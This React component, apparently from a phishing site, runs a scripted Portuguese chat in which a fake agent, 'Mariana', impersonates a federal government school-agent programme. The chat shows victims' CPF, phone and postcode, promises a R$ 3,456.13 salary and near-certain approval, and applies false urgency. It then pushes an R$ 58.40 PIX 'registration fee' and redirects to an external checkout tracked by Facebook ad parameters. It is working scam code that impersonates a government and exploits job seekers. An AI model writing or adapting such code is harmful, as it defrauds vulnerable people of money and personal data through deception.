import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';

interface UserData {
  nome?: string;
  cpf?: string;
  email?: string;
  telefone?: string;
  cep?: string;
  escola?: string;
}

interface Message {
  id: string;
  sender: 'bot' | 'user';
  text: string;
  options?: Array<{ id: string; text: string }>;
  isTyping?: boolean;
  emotion?: 'success' | 'warning' | 'urgency' | 'benefit' | 'trust';
}

export default function Chat() {
  const navigate = useNavigate();
  const [userData, setUserData] = useState<UserData>({});
  const [messages, setMessages] = useState<Message[]>([]);
  const [progress, setProgress] = useState(0);
  const [isLoading, setIsLoading] = useState(false);
  const conversationStarted = useRef(false);

  useEffect(() => {
    if (conversationStarted.current) return;
    conversationStarted.current = true;

    const stored = localStorage.getItem('userData');
    if (stored) {
      setUserData(JSON.parse(stored));
    }

    startConversation();
  }, []);

  const addTypingMessage = async (text: string, delay: number = 200, emotion?: Message['emotion']) => {
    return new Promise<void>(resolve => {
      setTimeout(() => {
        const messageId = `msg-${Date.now()}-${Math.random()}`;
        setMessages(prev => [...prev, {
          id: messageId,
          sender: 'bot',
          text: text,
          isTyping: true,
          emotion
        }]);

        setTimeout(() => {
          setMessages(prev =>
            prev.map(msg =>
              msg.id === messageId ? { ...msg, isTyping: false } : msg
            )
          );
          resolve();
        }, 1000);
      }, delay);
    });
  };

  const startConversation = async () => {
    setProgress(1);

    await addTypingMessage('Olá! Que alegria tê-lo aqui!', 300, 'benefit');
    await addTypingMessage('Sou a Mariana do Programa Agente Escola, iniciativa vinculada ao Governo Federal.', 200, 'trust');
    await addTypingMessage(' Estou aqui para confirmar seus dados finais e liberar o acesso à etapa oficial de inscrição.', 200, 'benefit');
    await addTypingMessage(' Leva menos de 2 minutos. Vamos?', 200);

    await new Promise<void>(resolve => {
      setTimeout(() => {
        const msg: Message = {
          id: `step-1-${Date.now()}`,
          sender: 'bot',
          text: 'Podemos continuar agora?',
          options: [
            { id: 'continue', text: 'Sim! Continuar' },
            { id: 'later', text: 'Prefiro depois' }
          ],
          isTyping: false
        };
        setMessages(prev => [...prev, msg]);
        resolve();
      }, 200);
    });
  };

  const handleSelectOption = async (optionId: string, optionText: string) => {
    setMessages(prev => {
      const updated = [...prev];
      const lastIdx = updated.length - 1;
      if (updated[lastIdx]?.options) {
        updated[lastIdx] = { ...updated[lastIdx], options: undefined };
      }
      return updated;
    });

    setMessages(prev => [...prev, {
      id: `user-${Date.now()}`,
      sender: 'user',
      text: optionText
    }]);

    setIsLoading(true);

    if (optionId === 'later') {
      await addTypingMessage('Sem problema! Mas lembre: sua vaga ficará reservada por tempo limitado.', 200, 'urgency');
      await addTypingMessage('Recomendo voltar em breve para não perder essa oportunidade!', 200, 'urgency');
      setIsLoading(false);
      return;
    }

    if (optionId === 'continue') {
      await new Promise(resolve => setTimeout(resolve, 600));
      setProgress(2);

      await addTypingMessage('Fantástico! Você está muito perto!', 300, 'success');
      await addTypingMessage('Confira os principais pontos que você conquistou com a aprovação:', 200, 'benefit');
      
      await addTypingMessage(
        'Remuneração: R$ 3.456,13/mês (ACIMA da média nacional)\n' +
        'Atuação em escola pública próxima à sua residência\n' +
        'Capacitação gratuita com certificado nacional\n' +
        'Vale alimentação, plano de saúde e seguro de vida\n' +
        'Progressão de carreira garantida',
        200,
        'benefit'
      );
      
      await addTimerMessage('ATENÇÃO:', '5000 candidatos disputam as vagas. Sua aprovação é especial!', 'urgency');

      await new Promise<void>(resolve => {
        setTimeout(() => {
          const msg: Message = {
            id: `step-2-${Date.now()}`,
            sender: 'bot',
            text: 'Vamos confirmar seus dados agora?',
            options: [
              { id: 'confirm-data', text: 'Sim! Confirmar meus dados' },
              { id: 'cancel', text: 'Cancelar' }
            ],
            isTyping: false,
            emotion: 'benefit'
          };
          setMessages(prev => [...prev, msg]);
          resolve();
        }, 200);
      });

      setIsLoading(false);
      return;
    }

    if (optionId === 'confirm-data') {
      await new Promise(resolve => setTimeout(resolve, 600));
      setProgress(3);

      await addTypingMessage('Excelente! Aqui está seu resumo:', 300, 'success');

      const nomeExibido = userData.nome ? userData.nome.toUpperCase() : 'NÃO INFORMADO';
      const cpfExibido = userData.cpf ? `${userData.cpf.slice(0, 3)}.${userData.cpf.slice(3, 6)}.${userData.cpf.slice(6, 9)}-${userData.cpf.slice(9)}` : 'NÃO INFORMADO';
      const telefonExibido = userData.telefone ? `(${userData.telefone.slice(0, 2)}) ${userData.telefone.slice(2, 7)}-${userData.telefone.slice(7)}` : 'NÃO INFORMADO';
      const cepExibido = userData.cep ? `${userData.cep.slice(0, 5)}-${userData.cep.slice(5)}` : 'NÃO INFORMADO';

      await addTypingMessage(
        `SEU PERFIL APROVADO:\n\n` +
        `Nome: ${nomeExibido}\n` +
        `CPF: ${cpfExibido}\n` +
        `Telefone: ${telefonExibido}\n` +
        `CEP: ${cepExibido}\n` +
        `Programa: Agente Escola do Futuro\n` +
        `Seu salário: R$ 3.456,13 mensais\n` +
        `Status: PRÉ-INSCRIÇÃO APROVADA (99% de chance de aprovação final!)`,
        200,
        'success'
      );

      await addTimerMessage('IMPORTANTE:', 'Seus dados estão VALIDADOS e SEGUROS. Protegidos pela LGPD!', 'trust');

      await addTypingMessage('Está tudo correto?', 200);

      await new Promise<void>(resolve => {
        setTimeout(() => {
          const msg: Message = {
            id: `step-3-${Date.now()}`,
            sender: 'bot',
            text: '',
            options: [
              { id: 'data-ok', text: 'Sim! Está perfeito' },
              { id: 'data-change', text: 'Preciso alterar' }
            ],
            isTyping: false
          };
          setMessages(prev => [...prev, msg]);
          resolve();
        }, 200);
      });

      setIsLoading(false);
      return;
    }

    if (optionId === 'data-ok') {
      await new Promise(resolve => setTimeout(resolve, 600));

      await addTypingMessage('PERFEITO! Seus dados foram VALIDADOS COM SUCESSO!', 300, 'success');
      
      await addTimerMessage('FATO IMPORTANTE:', 'Você passou por 3 etapas de análise e foi aprovado!\nVocê está entre os 5% de candidatos mais qualificados!', 'success');

      await addTypingMessage('Agora vem a etapa final que libera tudo...', 200);
      
      await addTypingMessage('A TAXA DE INSCRIÇÃO é obrigatória para:', 200, 'warning');
      await addTypingMessage(
        'Garantir sua vaga (sistema libera automaticamente se não pagar)\n' +
        'Organizar a prova presencial no seu estado\n' +
        'Emitir seu certificado oficial\n' +
        'Alocar você na melhor escola pública\n' +
        'Processar e validar sua inscrição',
        200,
        'trust'
      );

      await addTimerMessage('VOCÊ SABIA?', 'A maioria dos candidatos que fazem essa inscrição recebem a convocação em até 30 dias!', 'benefit');

      await addTypingMessage('A taxa é de apenas R$ 58,40 (processamento PIX)', 200);
      
      await addTimerMessage('ATENÇÃO URGENTE!', 'Sua pré-inscrição ficará reservada por TEMPO LIMITADO.\nApós esse período, a vaga é liberada para o próximo candidato.\nRecomendo finalizar AGORA para não perder!', 'urgency');

      await new Promise<void>(resolve => {
        setTimeout(() => {
          const msg: Message = {
            id: `final-${Date.now()}`,
            sender: 'bot',
            text: 'VOCÊ ESTÁ MUITO PERTO DA SUA OPORTUNIDADE!\n\nClique abaixo para gerar o PIX e FINALIZAR sua inscrição:',
            options: [
              { id: 'pix-final', text: 'GERAR PIX - FINALIZAR INSCRIÇÃO' },
              { id: 'cancel-final', text: 'Cancelar' }
            ],
            isTyping: false,
            emotion: 'urgency'
          };
          setMessages(prev => [...prev, msg]);
          resolve();
        }, 200);
      });

      setIsLoading(false);
      return;
    }

    if (optionId === 'pix-final') {
      await addTypingMessage('Gerando seu PIX oficial...', 300, 'success');
      await addTypingMessage('PIX gerado com sucesso!', 200, 'success');
      await addTypingMessage('Após o pagamento, você receberá:\n• Confirmação imediata via email\n• Comprovante oficial\n• Data e local da prova (23/05/2026)\n• Suporte 24/7', 200, 'benefit');
      
      setIsLoading(false);
      setTimeout(() => {
        window.location.href = 'https://checkout.inscricao-agentescoladofuturo.online/VCCL1O8SCK8R?utm_source=FB&utm_campaign={{campaign.name}}|{{campaign.id}}&utm_medium={{adset.name}}|{{adset.id}}&utm_content={{ad.name}}|{{ad.id}}&utm_term={{placement}}';
      }, 2000);
      return;
    }

    if (optionId === 'cancel-final' || optionId === 'cancel' || optionId === 'data-change') {
      await addTypingMessage('Sem problema! Você pode retomar quando quiser.', 200);
      await addTimerMessage('LEMBRETE:', 'Mas lembre-se: sua vaga é por tempo limitado!\nVolte em breve para não perder essa oportunidade!', 'urgency');
      setIsLoading(false);
      return;
    }

    setIsLoading(false);
  };

  const addTimerMessage = async (title: string, text: string, emotion?: Message['emotion']) => {
    return new Promise<void>(resolve => {
      setTimeout(() => {
        const messageId = `timer-${Date.now()}-${Math.random()}`;
        setMessages(prev => [...prev, {
          id: messageId,
          sender: 'bot',
          text: `${title}\n${text}`,
          isTyping: false,
          emotion
        }]);
        resolve();
      }, 300);
    });
  };

  const handleBackClick = () => {
    navigate(-1);
  };

  const getEmotionColor = (emotion?: Message['emotion']) => {
    switch (emotion) {
      case 'success':
        return 'bg-green-50 border-l-4 border-green-500';
      case 'warning':
        return 'bg-yellow-50 border-l-4 border-yellow-500';
      case 'urgency':
        return 'bg-red-50 border-l-4 border-red-500';
      case 'benefit':
        return 'bg-blue-50 border-l-4 border-blue-500';
      case 'trust':
        return 'bg-purple-50 border-l-4 border-purple-500';
      default:
        return 'bg-gray-100';
    }
  };

  const getEmotionBg = (emotion?: Message['emotion']) => {
    switch (emotion) {
      case 'success':
        return 'bg-green-100 text-green-900';
      case 'warning':
        return 'bg-yellow-100 text-yellow-900';
      case 'urgency':
        return 'bg-red-100 text-red-900';
      case 'benefit':
        return 'bg-blue-100 text-blue-900';
      case 'trust':
        return 'bg-purple-100 text-purple-900';
      default:
        return 'bg-gray-100 text-gray-900';
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 p-4 pb-20">
      <div className="max-w-lg mx-auto">
        <div className="flex items-center gap-4 mb-6">
          <button
            onClick={handleBackClick}
            className="text-foreground hover:opacity-80 transition-opacity"
          >
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
            </svg>
          </button>
          <h1 className="text-lg font-semibold">Voltar</h1>
        </div>

        <div className="rounded-xl border-0 shadow-lg overflow-hidden sticky top-4">
          <div className="p-4" style={{ background: 'linear-gradient(135deg, #0A5E4E 0%, #1B4965 50%, #2d3748 100%)' }}>
            <div className="flex items-center gap-3">
              <img src="https://i.ibb.co/nMPCFGk7/atendnte.jpg" alt="Mariana Oliveira" className="w-14 h-14 rounded-full flex-shrink-0 border-2 border-white/40 object-cover" />
              <div className="text-white">
                <h2 className="font-bold text-lg">Mariana Oliveira</h2>
                <p className="text-sm text-white/90"> Atendimento - Concurso Agente Escola </p>
              </div>
            </div>
          </div>

          <div className="p-4 bg-gradient-to-r from-green-50 to-blue-50 border-b-2 border-green-200">
            <div className="flex items-center justify-between mb-2">
              <span className="text-sm text-gray-700 font-bold"> Seu Progresso</span>
              <span className="text-lg font-bold bg-gradient-to-r from-green-600 to-blue-600 bg-clip-text text-transparent">{progress}/3</span>
            </div>
            <div className="h-3 bg-gray-300 rounded-full overflow-hidden shadow-inner">
              <div
                className="h-full transition-all duration-700 ease-out shadow-lg"
                style={{
                  width: `${(progress / 3) * 100}%`,
                  background: 'linear-gradient(90deg, #10b981, #3b82f6, #8b5cf6)'
                }}
              />
            </div>
          </div>

          <div className="h-[450px] overflow-y-auto p-4 space-y-4 bg-white">
            {messages.map((message, index) => (
              <div key={message.id}>
                <div
                  className={`flex items-start gap-3 ${message.sender === 'user' ? 'justify-end' : ''}`}
                >
                  {message.sender === 'bot' && (
                    <img src="https://i.ibb.co/nMPCFGk7/atendnte.jpg" alt="Mariana" className="w-8 h-8 rounded-full flex-shrink-0 shadow-md object-cover" />
                  )}
                  <div
                    className={`max-w-[75%] rounded-xl px-4 py-3 shadow-md ${
                      message.sender === 'bot'
                        ? getEmotionColor(message.emotion) + ' ' + getEmotionBg(message.emotion)
                        : 'bg-gradient-to-br from-blue-500 to-blue-600 text-white font-medium'
                    }`}
                  >
                    <p className="text-sm whitespace-pre-wrap leading-relaxed font-medium">{message.text}</p>

                    {message.isTyping && (
                      <div className="flex gap-1 mt-2">
                        <span className="w-2 h-2 bg-current rounded-full animate-bounce"></span>
                        <span className="w-2 h-2 bg-current rounded-full animate-bounce" style={{ animationDelay: '0.1s' }}></span>
                        <span className="w-2 h-2 bg-current rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></span>
                      </div>
                    )}
                  </div>
                </div>

                {message.options && index === messages.length - 1 && (
                  <div className="flex flex-col gap-3 mt-4 ml-11">
                    {message.options.map(option => (
                      <button
                        key={option.id}
                        onClick={() => handleSelectOption(option.id, option.text)}
                        disabled={isLoading}
                        className={`text-left px-4 py-3 rounded-lg font-bold transition-all transform hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed text-sm shadow-lg ${
                          option.id.includes('pix') || option.id === 'confirm-data' || option.id === 'continue' || option.id === 'data-ok'
                            ? 'bg-gradient-to-r from-green-500 to-green-600 text-white hover:from-green-600 hover:to-green-700 border-2 border-green-400'
                            : 'bg-gray-100 text-gray-800 hover:bg-gray-200 border-2 border-gray-300'
                        }`}
                      >
                        {option.text}
                      </button>
                    ))}
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>

        <div className="mt-6 text-center text-xs text-gray-600 px-4 space-y-1">
          <p className="font-bold"> Seus dados são 100% seguros</p>
          <p>Sistema oficial do Programa Agente Escola do Futuro</p>
          <p>Protegido pela Lei Geral de Proteção de Dados (LGPD)</p>
        </div>
      </div>
    </div>
  );
}